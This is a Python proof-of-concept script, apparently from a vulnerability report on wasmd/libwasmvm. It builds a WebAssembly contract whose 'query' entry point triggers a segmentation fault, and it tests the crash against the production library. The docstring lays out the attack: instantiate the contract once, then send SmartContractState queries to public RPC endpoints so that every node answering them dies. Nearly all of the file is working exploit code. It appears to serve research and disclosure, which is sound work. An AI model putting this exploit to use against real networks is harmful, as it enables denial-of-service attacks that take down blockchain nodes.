#!/usr/bin/env python3
"""
Second attack vector: the `query` entry point kills the node that answers it.

The gRPC query `SmartContractState` runs the contract's `query` entry point
inside the node that serves the request:

    wasmd/x/wasm/keeper/querier.go:192   SmartContractState
      -> q.keeper.QuerySmart(ctx, contractAddr, req.QueryData)
    wasmd/x/wasm/keeper/keeper.go:884
      -> k.wasmVM.Query(codeInfo.CodeHash, env, req, prefixStore, ...)

The `recover()` that wraps the call only catches Go *panics*; a `SIGSEGV` is
not a panic and nobody catches it.  The query gas limit
(`defaultSmartQueryGasLimit = 3_000_000` SDK gas) does not help either: the
fatal shape costs 4 652 SDK gas.

So an attacker can:

  1. instantiate the malicious contract once (a perfectly normal tx), and
  2. then throw `SmartContractState` queries at the network's public RPC
     endpoints: every node that answers dies.

This script measures that vector against the production `.so`:

  query-implicit   the leaking loop lives in the `query` entry point
  query-explicit   the control: the same module with an explicit `else`
  execute-implicit the loop in `execute` instead (the §2.8 vector)

Usage:
    python3 query_vector.py [--iters N]
"""

import argparse
import os
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import run_poc as R                                        # noqa: E402
from wasm_builder import (                                 # noqa: E402
    I32, I64, Module, op_br_if, op_call, op_drop, op_else, op_end, op_i32_const,
    op_i32_eq, op_i32_sub, op_i64_const, op_if, op_local_get, op_local_set,
    op_local_tee, op_loop, op_nop,
)
from wasm_builder import RESPONSE_JSON                     # noqa: E402


def build(iterations, prefix=4, explicit_else=False, entry="query"):
    """A contract whose `entry` point ('query' or 'execute') runs the leaking
    loop: register pressure + an `if` with a block parameter and an implicit
    else whose condition is false.

    The ABI differs between the two entry points:
      execute  -> (env_ptr, info_ptr, msg_ptr) -> result_ptr
      query    -> (env_ptr, msg_ptr)             -> result_ptr
    so the loop lives in an internal `$check` and each entry point calls it.
    """
    m = Module()
    m.add_memory(2, export="memory")
    m.add_data(16, (64).to_bytes(4, "little") + len(RESPONSE_JSON).to_bytes(4, "little")
               + len(RESPONSE_JSON).to_bytes(4, "little"))
    m.add_data(64, RESPONSE_JSON)
    # the allocator's Region: `allocate` returns 1024, the host writes the
    # env/msg there and reads the Region {offset, capacity, length}
    m.add_data(1024, (2048).to_bytes(4, "little") + (4096).to_bytes(4, "little")
               + (0).to_bytes(4, "little"))

    t_pass = m.add_type([I64], [I64])
    callee = m.add_func([], [], body=op_nop())

    # $check(value: i64, cond: i32, expected: i64) -> i32
    b = bytearray()
    b += op_i32_const(iterations) + op_local_set(3)
    b += op_loop()
    for _ in range(prefix):            # register pressure
        b += op_local_get(0)
    b += op_local_get(0)               # the block parameter
    b += op_i32_const(0)               # FALSE -> the path that skips cleanup
    b += op_if(t_pass)
    if explicit_else:
        b += op_else()
    b += op_end()
    b += op_drop()
    for _ in range(prefix):
        b += op_drop()
    b += op_local_get(3) + op_i32_const(1) + op_i32_sub() + op_local_tee(3)
    b += op_br_if(0)
    b += op_end()
    b += op_call(callee)               # the push that faults below the guard page
    b += op_i32_const(1)
    check = m.add_func([I64, I32, I64], [I32], locals=[I32], body=bytes(b))

    # the entry point that carries the loop
    call_check = (op_i64_const(123) + op_i32_const(0) + op_i64_const(123)
                  + op_call(check) + op_drop())
    if entry == "query":
        m.add_func([I32, I32], [I32], body=call_check + op_i32_const(16), export="query")
        m.add_func([I32, I32, I32], [I32], body=op_i32_const(16), export="execute")
    else:
        m.add_func([I32, I32, I32], [I32], body=call_check + op_i32_const(16), export="execute")
        m.add_func([I32, I32], [I32], body=op_i32_const(16), export="query")

    m.add_func([I32], [I32], body=op_i32_const(1024), export="allocate")
    m.add_func([I32], [], body=op_nop(), export="deallocate")
    m.add_func([I32, I32, I32], [I32], body=op_i32_const(16), export="instantiate")
    m.add_func([], [], body=op_nop(), export="interface_version_8")
    return m.build()


def run_child(wasm, entry):
    """Runs the module in this (forked) process."""
    vm = R.VM()
    base = tempfile.mkdtemp(prefix="wasmvm-q-")
    cache = vm.init_cache(base)
    checksum = vm.store_code(cache, wasm, checked=True)
    res, rep, err = vm.instantiate(cache, checksum, 1 << 62)
    if res.is_none:
        return "instantiate failed: %s" % vm._vec_str(err)
    if entry == "query":
        out, rep, err = vm.query(cache, checksum, 1 << 62)
    else:
        out, rep, err = vm.execute(cache, checksum, 1 << 62)
    txt = vm._vec_str(err)
    if txt:
        return "error: %s" % txt.strip().splitlines()[-1][:120]
    return "ok"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--iters", type=int, default=200000)
    args = ap.parse_args()

    print("Vector del `query`: el nodo que atiende la consulta ejecuta el contrato")
    print("libwasmvm: %s" % R.LIB)
    print("iteraciones por ejecucion: %d" % args.iters)
    print("=" * 78)

    cases = (
        ("query-implicit",   "query",    False),
        ("query-explicit",   "query",    True),
        ("execute-implicit", "execute",  False),
    )
    for tag, entry, explicit in cases:
        wasm = build(args.iters, explicit_else=explicit, entry=entry)
        pid = os.fork()
        if pid == 0:
            detail = run_child(wasm, entry)
            sys.stdout.write("%s\t%s\n" % (tag, detail))
            sys.stdout.flush()
            os._exit(0)
        _, status = os.waitpid(pid, 0)
        if status == 0:
            print("%-18s completed without crashing" % tag)
        elif status & 0x7f == 11:
            print("%-18s ** SIGSEGV — the process died **" % tag)
        else:
            print("%-18s child status=%d (signal %d)"
                  % (tag, status, status & 0x7f))
        sys.stdout.flush()

    print("=" * 78)
    print("El `recover()` de querier.go:208 solo captura panics de Go: un SIGSEGV")
    print("mata el nodo.  El limite de gas de la query (3 000 000) no protege:")
    print("la forma fatal cuesta 4 652 gas de SDK.")


if __name__ == "__main__":
    main()
